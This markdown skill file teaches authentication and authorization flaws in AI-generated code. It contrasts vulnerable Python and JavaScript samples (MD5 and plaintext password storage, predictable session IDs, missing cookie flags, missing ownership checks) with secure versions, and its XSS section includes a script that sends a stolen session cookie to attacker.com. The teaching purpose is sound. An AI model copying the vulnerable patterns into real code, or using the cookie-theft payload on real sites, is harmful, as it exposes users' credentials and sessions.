---
name: authentication-authorization-vulnerabilities-ai-code
description: Understand authentication and authorization defects in AI-generated code including insecure password storage, broken session management, and access control bypasses. Use this skill when you need to learn about auth vulnerabilities in AI code, understand why AI suggests MD5/plaintext passwords, recognize broken session patterns, or identify access control gaps. Triggers include "auth vulnerabilities AI", "password storage AI", "session management", "broken access control", "authentication defects", "MD5 passwords", "session hijacking", "authorization bypass".
---

# Authentication and Authorization Defects in AI-Generated Code

## The Systemic Nature of Auth Vulnerabilities

A 2025 study by Databricks revealed:

> "AI-generated authentication systems frequently incorporate outdated patterns and fail to implement modern security practices, creating what we call 'authentication debt' in codebases."

### The Statistics

The research found that:
- **73% of AI-generated authentication code** lacked proper session management
- **81% stored passwords insecurely** (MD5, SHA1, or plaintext)

These aren't edge cases—they're the norm in AI-generated authentication code.

## 1.2.1 Insecure Password Storage

### The Problem

The most alarming finding from multiple studies is the prevalence of **plaintext or weakly hashed password storage** in AI-generated code.

As noted by Infisical's security team:

> "AI models trained on older codebases often suggest MD5 or SHA1 for password hashing, algorithms that have been cryptographically broken for over a decade."

### AI-Generated Vulnerable Code

```python
# Prompt: "Implement user registration with password"
import hashlib
import mysql.connector

def register_user(username, password, email):
    conn = mysql.connector.connect(host='localhost', database='app')
    cursor = conn.cursor()

    # ❌ VULNERABLE: MD5 is cryptographically broken
    password_hash = hashlib.md5(password.encode()).hexdigest()

    # ❌ VULNERABLE: No salt means identical passwords have identical hashes
    query = "INSERT INTO users (username, password, email) VALUES (%s, %s, %s)"
    cursor.execute(query, (username, password_hash, email))

    conn.commit()
    return {"status": "success", "user_id": cursor.lastrowid}

# Even worse: Some AI models generate this
def register_user_worse(username, password, email):
    # ❌ CRITICAL: Storing plaintext passwords
    user_data = {
        "username": username,
        "password": password,  # Never do this!
        "email": email
    }
    database.save(user_data)
```

### Secure Implementation

```python
import bcrypt
import secrets
from datetime import datetime, timedelta

def register_user_secure(username, password, email):
    # ✅ SECURE: Validate password strength
    if len(password) < 12:
        raise ValueError("Password must be at least 12 characters")

    # ✅ SECURE: Use bcrypt with cost factor 12
    salt = bcrypt.gensalt(rounds=12)
    password_hash = bcrypt.hashpw(password.encode('utf-8'), salt)

    # ✅ SECURE: Generate secure activation token
    activation_token = secrets.token_urlsafe(32)
    token_expiry = datetime.utcnow() + timedelta(hours=24)

    user_data = {
        "username": username,
        "password_hash": password_hash,
        "email": email,
        "activation_token": activation_token,
        "token_expiry": token_expiry,
        "is_active": False,
        "created_at": datetime.utcnow(),
        "failed_login_attempts": 0,
        "last_failed_login": None
    }

    # Store with proper error handling
    try:
        user_id = database.create_user(user_data)
        send_activation_email(email, activation_token)
        return {"status": "success", "message": "Check email for activation"}
    except IntegrityError:
        return {"status": "error", "message": "Username or email already exists"}
```

### Why AI Generates Insecure Password Storage

**1. Training Data from Older Code:**
- Millions of examples from 2000s-2010s use MD5/SHA1
- AI learns these as "standard" approaches
- Doesn't know they're cryptographically broken

**2. Simplicity Bias:**
- `hashlib.md5()` is simpler than `bcrypt.gensalt()`
- Fewer lines of code
- No external dependencies in simple example

**3. Missing Security Knowledge:**
- AI doesn't understand rainbow tables
- Can't reason about hash collision attacks
- Doesn't know MD5 is broken

### Why MD5/SHA1 Are Broken

**MD5 Problems:**
- Can be computed **billions of times per second** on modern GPUs
- 8-character password: cracked in **minutes**
- Rainbow tables exist for common passwords
- Collision attacks demonstrated since 2004

**SHA1 Problems:**
- Also too fast to compute
- Google demonstrated practical collision attack (2017)
- NIST deprecated for cryptographic use (2011)

**What "Cryptographically Broken" Means:**
Not that hashes can be "decrypted" (they can't), but that:
- Brute force is too fast
- Collision attacks are practical
- No computational cost for attackers

### What Secure Hashing Requires

**bcrypt (Recommended):**
- **Adaptive cost factor:** Can be increased as hardware improves
- **Built-in salt:** Unique per password
- **Slow by design:** Makes brute force impractical
- **Industry standard:** Widely audited and trusted

**Cost Factor:**
```python
# Cost factor = 12 (recommended)
# 2^12 = 4,096 iterations
# Makes each hash computation slower
# Attacker must do 4,096 iterations per attempt
```

### Real-World Password Storage Breaches

**Ashley Madison (2015):**
- Custom authentication with **weak password hashing**
- **32 million accounts** compromised
- Passwords cracked within days
- Company nearly destroyed

**Dropbox (2012):**
- Custom authentication led to **password hash database theft**
- **68 million accounts** affected
- Many passwords cracked from hashes
- Years of credential stuffing attacks followed

**LinkedIn (2012):**
- Used **unsalted SHA-1** for passwords
- **117 million password hashes** stolen
- 90% of passwords cracked within days
- Used in credential stuffing attacks for years

### The Secure Alternative: Use Clerk

According to Veracode's 2024 report:

> Applications using managed authentication services (like Clerk, Auth0) had **73% fewer authentication-related vulnerabilities** than those with custom authentication.

**Why Clerk is Secure:**
- ✅ Uses bcrypt/Argon2 (modern, secure algorithms)
- ✅ Proper salt generation
- ✅ SOC 2 certified (audited security controls)
- ✅ Regular security updates
- ✅ Professional security team maintaining code

---

## 1.2.2 Broken Session Management

### The Problem

Research from The Hacker News found:

> "AI-generated session management code often lacks proper timeout mechanisms, secure cookie flags, and session fixation protection."

This creates multiple attack vectors for session hijacking.

### AI-Generated Vulnerable Code

```javascript
// Prompt: "Implement user sessions"
const sessions = {};

app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    if (await validateCredentials(username, password)) {
        // ❌ VULNERABLE: Predictable session ID
        const sessionId = Buffer.from(username + Date.now()).toString('base64');

        // ❌ VULNERABLE: No expiration
        sessions[sessionId] = {
            username: username,
            loginTime: Date.now()
        };

        // ❌ VULNERABLE: Missing security flags
        res.cookie('sessionId', sessionId);
        res.json({ success: true });
    }
});

app.get('/profile', (req, res) => {
    const sessionId = req.cookies.sessionId;

    // ❌ VULNERABLE: No session validation or renewal
    if (sessions[sessionId]) {
        const userData = getUserData(sessions[sessionId].username);
        res.json(userData);
    }
});
```

### Multiple Vulnerabilities in This Code

**1. Predictable Session IDs:**
```javascript
const sessionId = Buffer.from(username + Date.now()).toString('base64');
```

**Problem:**
- Attacker knows username (public)
- Can guess timestamp (Date.now() when login occurred)
- Can recreate session ID and hijack session

**2. No Session Expiration:**
```javascript
sessions[sessionId] = { username, loginTime }
```

**Problem:**
- Session never expires
- Stolen session valid forever
- No automatic logout

**3. Missing Cookie Security Flags:**
```javascript
res.cookie('sessionId', sessionId);
```

**Problem:**
- No `httpOnly`: JavaScript can access (XSS steals session)
- No `secure`: Sent over HTTP (man-in-the-middle)
- No `sameSite`: Vulnerable to CSRF

**4. In-Memory Storage:**
```javascript
const sessions = {};
```

**Problem:**
- Lost on server restart
- Doesn't scale (multiple servers)
- No persistence

**5. No Session Validation:**
```javascript
if (sessions[sessionId]) { /* grant access */ }
```

**Problem:**
- No IP validation (session stolen from different location works)
- No user-agent check (different browser works)
- No session renewal (stale sessions accepted)

### Secure Implementation

```javascript
const crypto = require('crypto');
const redis = require('redis');
const client = redis.createClient();

// Session configuration
const SESSION_DURATION = 3600; // 1 hour in seconds
const SESSION_RENEWAL_THRESHOLD = 900; // Renew if less than 15 min remaining

app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    // ✅ SECURE: Rate limiting
    const attempts = await getFailedAttempts(username);
    if (attempts > 5) {
        return res.status(429).json({ error: 'Too many failed attempts' });
    }

    if (await validateCredentials(username, password)) {
        // ✅ SECURE: Cryptographically secure session ID
        const sessionId = crypto.randomBytes(32).toString('hex');

        // ✅ SECURE: Store session data in Redis with expiration
        const sessionData = {
            username: username,
            loginTime: Date.now(),
            lastActivity: Date.now(),
            ipAddress: req.ip,
            userAgent: req.get('user-agent')
        };

        await client.setex(
            `session:${sessionId}`,
            SESSION_DURATION,
            JSON.stringify(sessionData)
        );

        // ✅ SECURE: Secure cookie configuration
        res.cookie('sessionId', sessionId, {
            httpOnly: true,       // Prevent XSS access
            secure: true,         // HTTPS only
            sameSite: 'strict',   // CSRF protection
            maxAge: SESSION_DURATION * 1000
        });

        // Clear failed attempts
        await clearFailedAttempts(username);

        res.json({ success: true });
    } else {
        await incrementFailedAttempts(username);
        res.status(401).json({ error: 'Invalid credentials' });
    }
});

// Middleware for session validation and renewal
async function validateSession(req, res, next) {
    const sessionId = req.cookies.sessionId;

    if (!sessionId) {
        return res.status(401).json({ error: 'No session' });
    }

    const sessionData = await client.get(`session:${sessionId}`);

    if (!sessionData) {
        return res.status(401).json({ error: 'Invalid session' });
    }

    const session = JSON.parse(sessionData);

    // ✅ SECURE: Validate session consistency
    if (session.ipAddress !== req.ip) {
        await client.del(`session:${sessionId}`);
        return res.status(401).json({ error: 'Session invalidated' });
    }

    // ✅ SECURE: Automatic session renewal
    const ttl = await client.ttl(`session:${sessionId}`);
    if (ttl < SESSION_RENEWAL_THRESHOLD) {
        await client.expire(`session:${sessionId}`, SESSION_DURATION);
    }

    // Update last activity
    session.lastActivity = Date.now();
    await client.setex(
        `session:${sessionId}`,
        SESSION_DURATION,
        JSON.stringify(session)
    );

    req.session = session;
    next();
}

app.get('/profile', validateSession, (req, res) => {
    const userData = getUserData(req.session.username);
    res.json(userData);
});
```

### Why AI Generates Broken Sessions

**1. Complexity Avoidance:**
- Redis requires external dependency
- crypto.randomBytes() less common than Buffer/base64
- Proper session management is complex

**2. Training Data Shortcuts:**
- Tutorial code uses in-memory storage for simplicity
- Examples skip security flags for brevity
- AI learns simplified patterns

**3. Functional Focus:**
- Session "works" without security features
- Tests pass without expiration/renewal
- AI optimizes for functionality, not security

### Session Attack Scenarios

**Attack 1: Predictable ID Guessing**
```javascript
// Vulnerable session ID
sessionId = Buffer.from("john_doe" + "1704067200000").toString('base64');

// Attacker guesses:
// - Username: from public profile
// - Timestamp: login time (±  few minutes)
// → Can recreate session ID
```

**Attack 2: XSS Session Theft**
```javascript
// Without httpOnly flag
<script>
  const sessionId = document.cookie.match(/sessionId=([^;]+)/)[1];
  fetch('https://attacker.com/steal?session=' + sessionId);
</script>
// Steals session cookie via XSS
```

**Attack 3: Session Fixation**
```javascript
// Attacker sets victim's session ID before login
// Victim logs in with attacker's session ID
// Attacker now logged in as victim
```

---

## 1.2.3 Broken Access Control

### The Problem

According to analytics from ZenCoder:

> "Authorization bugs in AI-generated code are particularly dangerous because they often pass functional tests while leaving gaping security holes."

The AI frequently generates code that:
- ✅ Checks if user is **authenticated** (logged in)
- ❌ Fails to verify if user is **authorized** (has permission)

### AI-Generated Vulnerable Code

```python
# Prompt: "Create API to fetch user documents"
from flask import Flask, request, jsonify
app = Flask(__name__)

@app.route('/api/document/<doc_id>')
@require_login  # Checks if user is logged in
def get_document(doc_id):
    # ❌ VULNERABLE: No authorization check
    # Any logged-in user can access any document
    document = db.documents.find_one({'id': doc_id})

    if document:
        return jsonify(document)
    else:
        return jsonify({'error': 'Document not found'}), 404

@app.route('/api/user/<user_id>/profile')
@require_login
def get_user_profile(user_id):
    # ❌ VULNERABLE: No verification that current user can access this profile
    profile = db.profiles.find_one({'user_id': user_id})
    return jsonify(profile)
```

### Why This Is Vulnerable

**Authentication ≠ Authorization**

**Authentication:** "Who are you?"
- Proves identity (username + password, token, etc.)
- Confirms you are a valid user

**Authorization:** "What can you do?"
- Checks permissions for specific resources
- Verifies ownership or access rights

**The Vulnerability:**
```python
@app.route('/api/document/<doc_id>')
@require_login  # ✓ User authenticated
def get_document(doc_id):
    document = db.documents.find_one({'id': doc_id})
    return jsonify(document)  # ✗ But can access ANY document!
```

**Attack:**
- Alice creates private document (doc_123)
- Bob logs in (authenticated)
- Bob requests `/api/document/doc_123`
- Server returns Alice's private document ❌

### Secure Implementation

```python
from flask import Flask, request, jsonify, g
from functools import wraps
import jwt

app = Flask(__name__)

def require_authorization(resource_type):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            # ✅ SECURE: Extract and verify JWT token
            token = request.headers.get('Authorization', '').replace('Bearer ', '')
            try:
                payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
                g.current_user = payload
            except jwt.InvalidTokenError:
                return jsonify({'error': 'Invalid token'}), 401

            # ✅ SECURE: Check specific permissions
            if resource_type == 'document':
                doc_id = kwargs.get('doc_id')
                if not can_access_document(g.current_user['id'], doc_id):
                    return jsonify({'error': 'Access denied'}), 403

            elif resource_type == 'profile':
                user_id = kwargs.get('user_id')
                if not can_access_profile(g.current_user['id'], user_id):
                    return jsonify({'error': 'Access denied'}), 403

            return f(*args, **kwargs)
        return decorated_function
    return decorator

def can_access_document(current_user_id, doc_id):
    # ✅ SECURE: Verify document ownership or sharing permissions
    document = db.documents.find_one({
        'id': doc_id,
        '$or': [
            {'owner_id': current_user_id},
            {'shared_with': current_user_id},
            {'is_public': True}
        ]
    })
    return document is not None

def can_access_profile(current_user_id, target_user_id):
    # ✅ SECURE: Users can only access their own profile or public profiles
    if current_user_id == target_user_id:
        return True

    # Check if target profile is public
    profile = db.profiles.find_one({'user_id': target_user_id})
    return profile and profile.get('is_public', False)

@app.route('/api/document/<doc_id>')
@require_authorization('document')
def get_document(doc_id):
    # ✅ SECURE: Additional access logging
    log_access(g.current_user['id'], 'document', doc_id)

    document = db.documents.find_one({'id': doc_id})

    # ✅ SECURE: Sanitize sensitive fields based on permissions
    if document['owner_id'] != g.current_user['id']:
        document.pop('edit_history', None)
        document.pop('internal_notes', None)

    return jsonify(document)

@app.route('/api/user/<user_id>/profile')
@require_authorization('profile')
def get_user_profile(user_id):
    profile = db.profiles.find_one({'user_id': user_id})

    # ✅ SECURE: Return different data based on access level
    if g.current_user['id'] != user_id:
        # Return only public fields for other users
        public_fields = ['username', 'bio', 'avatar_url', 'created_at']
        profile = {k: v for k, v in profile.items() if k in public_fields}

    return jsonify(profile)
```

### Why AI Fails at Access Control

**1. Function Over Security:**
- Prompt: "Fetch user documents"
- AI focuses on "fetch" logic
- Skips "who can fetch" logic

**2. Test Coverage Blind Spot:**
- Functional test: "Can I fetch my documents?" ✓ Pass
- Security test: "Can I fetch other users' documents?" ✗ Not tested
- AI generates code that passes functional tests

**3. Decorator Misunderstanding:**
- `@require_login` seems security-related
- AI assumes it's sufficient
- Doesn't add authorization logic

### Access Control Attack Patterns

**Attack 1: Direct Object Reference**
```python
# Vulnerable endpoint
GET /api/user/123/orders

# Attack: Change ID
GET /api/user/456/orders  # Access other user's orders
```

**Attack 2: Parameter Tampering**
```javascript
// Vulnerable code
app.delete('/api/post/:id', async (req, res) => {
    await db.posts.delete({ id: req.params.id });
    // Missing: check if current user owns this post
});

// Attack: Delete anyone's posts
DELETE /api/post/any-post-id
```

**Attack 3: Privilege Escalation**
```python
# Vulnerable code
@app.route('/api/admin/users')
@require_login
def list_users():
    return jsonify(db.users.find())  # Missing: check if user is admin
```

## Real-World Authentication Breach Examples

### Ashley Madison (2015)
- **Vulnerability:** Weak password hashing
- **Impact:** 32 million accounts compromised
- **Outcome:** Company reputation destroyed, lawsuits, executive resignations

### Dropbox (2012)
- **Vulnerability:** Custom authentication system flaws
- **Impact:** 68 million accounts affected
- **Outcome:** Password hash database stolen, years of credential stuffing attacks

### LinkedIn (2012)
- **Vulnerability:** Unsalted SHA-1 password hashing
- **Impact:** 117 million password hashes stolen
- **Outcome:** 90% cracked within days, used in attacks for years

## Implementation: Secure Authentication with Clerk

For this Next.js project, **use Clerk instead of building custom auth:**

```typescript
// app/api/protected/route.ts
import { auth } from '@clerk/nextjs/server';
import { handleUnauthorizedError, handleForbiddenError } from '@/lib/errorHandler';

export async function GET(request: NextRequest) {
  // ✅ SECURE: Clerk handles authentication
  const { userId } = await auth();

  if (!userId) {
    return handleUnauthorizedError();
  }

  // ✅ SECURE: Check authorization (ownership)
  const document = await db.documents.findOne({ id: docId });

  if (document.userId !== userId) {
    return handleForbiddenError('You do not have access to this document');
  }

  return NextResponse.json({ document });
}
```

**What Clerk Provides:**
- ✅ bcrypt/Argon2 password hashing
- ✅ Secure session management
- ✅ Automatic expiration/renewal
- ✅ httpOnly, secure, sameSite cookies
- ✅ MFA support
- ✅ Account lockout
- ✅ SOC 2 certification

→ **See `auth-security` skill** for complete Clerk implementation guide

## Statistics Summary

| Vulnerability | AI Occurrence Rate | Impact |
|---------------|-------------------|---------|
| Weak password hashing (MD5/SHA1) | 81% | Credential theft |
| Plaintext password storage | ~15% | Critical breach |
| No session expiration | 73% | Indefinite access |
| Missing cookie security flags | ~80% | XSS/CSRF/MITM |
| Predictable session IDs | ~40% | Session hijacking |
| Missing authorization checks | ~60% | Access control bypass |

**Source:** Databricks 2025 AI Security Study, Veracode 2024 Report

## See Also

### Implementation Skills (How to Fix)

→ **`auth-security` skill** - Use Clerk for secure authentication
→ **`error-handling` skill** - Handle auth errors (401, 403)
→ **`security-testing` skill** - Test authentication and authorization

### Related Awareness Skills

→ **`information-leakage` skill** - Credentials in logs
→ **`injection-vulnerabilities` skill** - Auth bypass via SQL injection
→ **`awareness-overview` skill** - Overall AI security risks

## Key Takeaways

✅ **81% of AI auth code** stores passwords insecurely
✅ **73% lacks proper session management**
✅ **Authentication ≠ Authorization** - AI often checks one, not both
✅ **Real-world breaches** prove custom auth is high-risk
✅ **Solution:** Use Clerk (73% fewer vulnerabilities)
✅ **Testing:** Verify ownership checks before allowing access

**Remember:** Building secure authentication takes 2-4 weeks for experts. For vibe coders: **use Clerk, not custom code**.

---

**Related References:**

[9] Databricks. (2025). "Passing the Security Vibe Check: The Dangers of Vibe Coding."
[10] Infisical. (2025). "A Vibe Coding Security Playbook: Keeping AI-Generated Code Safe."
[11] The Hacker News. (2025). "Secure Vibe Coding: The Complete New Guide."
[12] ZenCoder. (2025). "5 Vibe Coding Risks and Ways to Avoid Them in 2025."
